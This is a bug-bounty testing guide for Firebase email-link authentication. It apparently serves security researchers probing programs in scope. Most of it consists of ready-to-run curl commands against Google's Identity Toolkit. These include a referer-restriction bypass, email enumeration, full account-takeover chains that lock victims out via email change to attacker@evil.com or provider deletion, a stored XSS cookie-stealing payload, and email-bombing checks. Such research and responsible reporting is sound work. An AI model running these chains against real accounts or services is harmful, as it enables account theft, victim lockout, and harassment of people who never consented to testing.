# Firebase Auth Email-Link Testing

## When to Use
- Target uses Firebase Auth (auth domain, `/__/firebase/init.json` exposed)
- Firebase API key found in client-side config
- Auth domain pattern: `auth.<target>.com` resolving to Firebase Hosting IPs

## Key Discovery: API Key Referer Restriction Bypass
Firebase API keys are often **HTTP referer-restricted** to the target domain. Requests without the correct `Referer` header return:
```json
{"error":{"code":403,"message":"Requests from referer <empty> are blocked.","details":[{"reason":"API_KEY_HTTP_REFERRER_BLOCKED"}]}}
```

**Fix:** Add `-H "Referer: https://www.target.com/"` to all Identity Toolkit requests.

## Auth Flow (Email Link / Passwordless)

```
1. sendOobCode (email) → Firebase sends sign-in link to email
2. User clicks link → oobCode extracted from URL params
3. signInWithEmailLink (oobCode + email) → Firebase idToken + refreshToken
4. App exchanges idToken → backend session (cookie/JWT)
```

### Step 1: Send Sign-In Link
```bash
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"requestType":"EMAIL_SIGNIN","email":"your@email.com","continueUrl":"http://localhost:5001/callback","canHandleCodeInApp":true}'
```
Response: `{"kind":"identitytoolkit#GetOobConfirmationCodeResponse","email":"your@email.com"}`

### Step 2: Extract oobCode
The email contains a link like:
`https://auth.target.com/__/auth/action?mode=signIn&oobCode=XXXXX&continueUrl=...`
Extract the `oobCode` parameter.

### Step 3: Exchange for idToken
```bash
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithEmailLink?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"oobCode":"<EXTRACTED_CODE>","email":"your@email.com"}'
```
Response contains: `idToken`, `refreshToken`, `localId`

### Step 4: Exchange idToken for App Session
Try multiple body formats against the app's auth endpoint:
```bash
# Common patterns:
curl -sk -X POST "https://api.target.com/v1/auth" \
  -H "Content-Type: application/json" \
  -H "Origin: https://www.target.com" \
  -d '{"token":"<idToken>"}'

# Or:
-d '{"firebaseToken":"<idToken>"}'
-d '{"idToken":"<idToken>"}'
```

### Token Refresh
```bash
curl -sk -H "Referer: https://www.target.com/" \
  "https://securetoken.googleapis.com/v1/token?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"grant_type":"refresh_token","refresh_token":"<REFRESH_TOKEN>"}'
```

## Flask Session Emulator Pattern

For targets with complex auth flows, build a local Flask app that:
1. Manages the Firebase sign-in link flow via UI
2. Captures oobCode via a local callback endpoint
3. Exchanges for idToken automatically
4. Stores session cookies for subsequent API testing
5. Provides an API tester form for authenticated requests

**Port note:** On macOS, port 5000 is used by AirPlay Receiver. Use port 5001+.

## Enumeration Before Auth
These requests work without authentication (with referer):
```bash
# Check if email is registered
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=<API_KEY>" \
  -X POST -H "Content-Type: application/json" \
  -d '{"identifier":"user@email.com","continueUri":"https://www.target.com/"}'
# registered=true/false in response
```
⚠️ Email enumeration may be OUT OF SCOPE in many programs.

## Advanced Attack Chains

### Chain 1: Pre-Registration ATO via Password Provider
If the target uses email-link (passwordless) but has password provider enabled:

```bash
# 1. Create account with victim's email + attacker password
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@email.com","password":"AttackerPass1!","returnSecureToken":true}'

# 2. Victim later signs up via email-link → SAME Firebase UID (account linking)

# 3. Attacker signs in with password → gets same UID → same app session
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@email.com","password":"AttackerPass1!","returnSecureToken":true}'

# 4. Unlink victim's emailLink provider → victim permanently locked out
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"idToken":"<TOKEN>","deleteProvider":["emailLink"]}'

# 5. Verify: only password provider remains
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"identifier":"victim@email.com","continueUri":"https://www.target.com"}'
# Returns: signinMethods: ["password"] — victim can't use emailLink anymore
```

**Impact:** Full ATO — attacker has persistent access, victim locked out.
**Severity:** Critical if password provider is enabled on a passwordless-only platform.

### Chain 2: Unverified Email Change → Post-Auth ATO (PROVEN)

Full attack chain that permanently steals an account once attacker has victim's idToken:

```bash
# PREREQUISITES: Attacker has victim's idToken (via XSS on localStorage, shared device, etc.)
# Token often stored in localStorage as plaintext (e.g. wt_AUTH_TMP_USER_INFO)

# Step 1: Attacker changes victim's email to attacker-controlled email
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"idToken":"<VICTIM_TOKEN>","email":"attacker@evil.com","returnSecureToken":true}'
# SUCCESS: email changed instantly, NO verification email to old or new address
# Response contains new idToken with updated email

# Step 2: Verify victim is locked out
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@original.com","password":"VictimPass","returnSecureToken":true}'
# Returns: EMAIL_NOT_FOUND (victim permanently locked out)

# Step 3: Attacker signs in with new email + victim's original password
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"VictimPass","returnSecureToken":true}'
# SUCCESS: same UID, full account access

# Step 4 (optional): Attacker resets password to fully own the account
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"requestType":"PASSWORD_RESET","email":"attacker@evil.com"}'
# Reset link goes to attacker's inbox
```

**Verification checklist:**
- [ ] Email changed without confirmation to OLD address
- [ ] Email changed without confirmation to NEW address  
- [ ] No re-authentication required (just idToken)
- [ ] Victim gets `EMAIL_NOT_FOUND` on login
- [ ] Attacker logs in with same UID
- [ ] `emailVerified` stays `false` (no verification gate)

**Impact:** Permanent ATO — attacker owns account, victim has zero recovery path.
**Prerequisite:** Attacker needs victim's idToken (XSS, localStorage theft, shared device).
**Note:** Cannot change to an email that's ALREADY registered (returns `EMAIL_EXISTS`).

**Check:** Does the backend grant different access based on email domain? Test with `@target.com`, `@company.com` internal domains.

### Chain 3: XSS via JWT Claims
```bash
# Store XSS payload in displayName (persisted in every Firebase JWT)
curl -sk -H "Referer: https://www.target.com/" \
  "https://identitytoolkit.googleapis.com/v1/accounts:update?key=<API_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"idToken":"<TOKEN>","displayName":"<script>alert(document.cookie)</script>","photoUrl":"javascript:alert(1)"}'
```

**Impact:** If backend/frontend renders the JWT `name` or `picture` claim without sanitization → stored XSS. Decode the JWT payload to confirm the claims are included.

### Chain 4: Firebase Installations → FIS Token
```bash
# Get Firebase Installation ID + auth token (no user auth needed)
curl -sk -H "Referer: https://www.target.com/" \
  -H "x-goog-api-key: <API_KEY>" \
  "https://firebaseinstallations.googleapis.com/v1/projects/<PROJECT_ID>/installations" \
  -H "Content-Type: application/json" \
  -d '{"appId":"<APP_ID>","authVersion":"FIS_v2","sdkVersion":"w:0.6.4"}'
# Returns: fid, refreshToken, authToken — use for FCM, Remote Config, etc.
```

## Security Findings to Look For
- **No rate limit on sendOobCode** → email bombing
- **Token not user-bound** → shared token across requests (replay)
- **continueUrl open redirect** → redirect to attacker domain after auth
- **Signup not disabled** → create accounts on invite-only platforms
- **Firebase RTDB/Storage rules** → test after getting idToken (authenticated != authorized)
- **Referer bypass** → if removing referer still works, the key restriction is misconfigured
- **Password provider enabled on passwordless platform** → pre-registration ATO chain
- **accounts:update allows email change without verification** → impersonation, internal email claim
- **deleteProvider unrestricted** → attacker can remove victim's auth provider (lockout)
- **displayName/photoUrl unsanitized** → stored XSS via JWT claims
- **Email enumeration enabled** → signInWithPassword returns EMAIL_NOT_FOUND vs INVALID_LOGIN_CREDENTIALS
- **continueUrl domain allowlist too broad** → test all subdomains, not just www
- **accounts:delete self-deletion** → user can delete own account via API (bypass app-level deletion flow)
- **Separate error messages** → `INVALID_PASSWORD` vs `INVALID_LOGIN_CREDENTIALS` vs `EMAIL_NOT_FOUND` leaks existence
- **GCP project number leak** → Dynamic Links 403 error leaks `consumer: "projects/NNNNN"` — use for further GCP enumeration (test: `POST firebasedynamiclinks.googleapis.com/v1/shortLinks?key=<API_KEY>` with any body → 403 reveals project number in `metadata.consumer`)
- **Staging bucket from project ID** → once you have the Firebase project name, test `staging.<project>.appspot.com` on GCS (common App Engine staging bucket pattern)
- **accounts:update preserves password** → when attacker changes victim's email, the ORIGINAL password still works on the new email. Attacker doesn't need to know or reset the password if they have the idToken

## Firebase → App Session Gap (Common Blocker)

Many apps have a TWO-LAYER auth model:
1. **Firebase layer** — idToken from Firebase Auth (what we can control)
2. **App layer** — backend session cookie/JWT issued after Firebase token exchange

The Firebase token alone often returns 401 on the app's API. The exchange endpoint (often `/auth`, `/session`, `/z/auth`) has an UNKNOWN body format that's hard to reverse without capturing real traffic from the app.

**PRIORITY ORDER (do #1 FIRST, not last):**

1. **BROWSER CAPTURE (DO THIS FIRST)** — Complete a real login flow in the browser with network interceptor. This is the ONLY reliable way to discover the exchange body format. Don't waste time guessing with curl.
   - Navigate to login page → set up fetch/XHR interceptor → complete auth → capture the POST to the exchange endpoint
   - If emailLink flow: send real auth email → get oobCode from temp inbox → use real oobCode in browser callback page
   - The interceptor must capture: URL, method, headers, and FULL request body
   - PITFALL: If the account already exists with password provider, emailLink signIn will silently fail. Use a FRESH email that was never registered via password.

2. **JS bundle analysis** — Search chunks loaded on login/callback pages for the exchange endpoint call. Look for fetch/axios calls with `/auth` or `/session` in the URL.

3. **SSR proxy patterns** — If the exchange is server-side (e.g., Next.js API route, `/z/` prefix), the body format is whatever the SSR layer forwards to the backend. Check `window.__CONFIG__` for proxy endpoint prefixes.

4. **Common body formats (LAST RESORT)** — Only try these if #1-3 failed:
   `{"idToken":"..."}`, `{"token":"..."}`, `{"firebaseToken":"..."}`, `{"credential":"..."}`

**WinTicket lesson (June 2026):** 50+ curl attempts with different body formats all returned "Invalid request". The browser capture approach was attempted too late in the process. Always do browser capture FIRST — it takes 5 minutes and gives you the exact format.

**Impact without bridging:** Firebase-layer findings (account creation, email change, enumeration) are real but typically Low-Medium severity unless you can prove they translate to app-level access. Programs reject "if attacker has token, then ATO" without proving how attacker gets the token.

## Email Bombing Verification (CRITICAL)

When testing rate limits on email-sending endpoints:
1. HTTP 204/200 response does NOT prove email delivery
2. **ALWAYS verify in the actual inbox** — use temp email (mail.tm API) and COUNT messages
3. Server may return success but rate-limit/deduplicate on the delivery side
4. Wait 30+ seconds before checking inbox (delivery delay)
5. Report the ACTUAL delivered count, not the HTTP response count
6. Check email content — confirm it's from the target domain and contains actionable links
7. Test with multiple rapid requests (5-10) and verify ALL arrive, not just one

### mail.tm API quick reference:
```bash
# Create account
curl -s "https://api.mail.tm/accounts" -H "Content-Type: application/json" \
  -d '{"address":"test@domain.net","password":"Pass123!"}'

# Get token
TOKEN=$(curl -s "https://api.mail.tm/token" -H "Content-Type: application/json" \
  -d '{"address":"test@domain.net","password":"Pass123!"}' | python3 -c "import json,sys;print(json.load(sys.stdin)['token'])")

# Check inbox (wait 30s after sending)
curl -s "https://api.mail.tm/messages" -H "Authorization: Bearer $TOKEN"

# Read specific message
curl -s "https://api.mail.tm/messages/<id>" -H "Authorization: Bearer $TOKEN"
```

## Severity Reality Check

**Firebase findings that are NOT standalone High/Critical:**
- Email change without verification → requires victim's idToken first (post-auth escalation, not zero-click ATO)
- Account self-deletion via API → standard Firebase behavior, most programs won't accept
- Unrestricted account creation (signUp) → only matters if the platform is invite-only
- Email enumeration → Low at best, many programs mark as informational/accepted-risk
- Password reset to arbitrary users → Firebase standard behavior, not a vuln

**Firebase findings that ARE reportable:**
- Pre-registration ATO (password provider on passwordless platform) → Critical if proven end-to-end with app session access
- Email bombing with no rate limit → Medium (prove with actual inbox count)
- Unrestricted signUp on invite-only platform → Medium if app grants access to unauthorized accounts

**The bridge problem:** Firebase-layer findings without proving app-layer access are typically Low. The `/z/auth` or session exchange endpoint is the critical link. Without capturing the real body format (via browser DevTools on a real login flow), you cannot prove Firebase→App impact.

## Provider Conflict Gotcha

When a Firebase account already exists with `password` provider, sending an emailLink to that address and trying `signInWithEmailLink` will FAIL or conflict. The app may show no error but silently reject.

Workaround for testing: use a FRESH email address that has never been registered via password on that Firebase project. Delete the password account first if needed (requires fresh idToken — tokens expire after 1 hour).
